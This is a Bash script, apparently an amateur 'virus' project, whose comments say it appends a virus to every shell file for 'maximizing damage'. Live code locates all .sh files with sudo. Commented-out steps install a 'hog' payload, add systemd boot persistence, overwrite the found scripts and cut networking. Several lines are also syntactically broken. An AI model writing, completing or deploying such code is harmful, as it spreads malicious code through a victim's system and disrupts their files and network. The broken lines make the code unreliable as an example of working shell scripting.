# adds onto all system shell files for inserting the virus onto the system for maximizing damage:
# /usr/src/linux-headers-5.15.0-47/arch/powerpc/boot/install.sh
# DONT RUN THIS considering the damages it can do if added to a commonly used shell file

PATH_TO_DAMAGE=$(sudo find / -name '*.sh')

echo "$PATH_TO_DAMAGE" # view the files to append to

DIR=$PWD

# add virus where it will be called every time the computer boots
#if [ -f etc/systemd/system/script_daemon.service ]; then
#	cp $DIR/hog.sh etc/systemd/system/hog.sh
#	cp $DIR/hog etc/systemd/system/hog
#	cp $DIR/run.sh etc/systemd/system/run.sh
#	cp $DIR/add_to_system.service etc/systemd/system/script_daemon.service
#	sudo systemctl daemon-reload
#	sudo systemctl enable etc/systemd/system/script_daemon.service
#fi

#echo "$PATH_TO_DAMAGE"
for path in "$PATH_TO_DAMAGE"; do
	PATH_=$dirname $path
#	sudo cat $path hog.sh > $PATH_/_tmp_output
#	mv -f $PATH_/_tmp_output $path
	echo start $PATH_ = PATH
	
#	echo $path = path
#	sudo cp $DIR/hog $PATH/hog
#	sudo cp $DIR/run.sh $PATH/run.sh
#	sudo cp $DIR/makefile $PATH/makefile
done

# disconnect wifi for no reason
#nmcli networking off
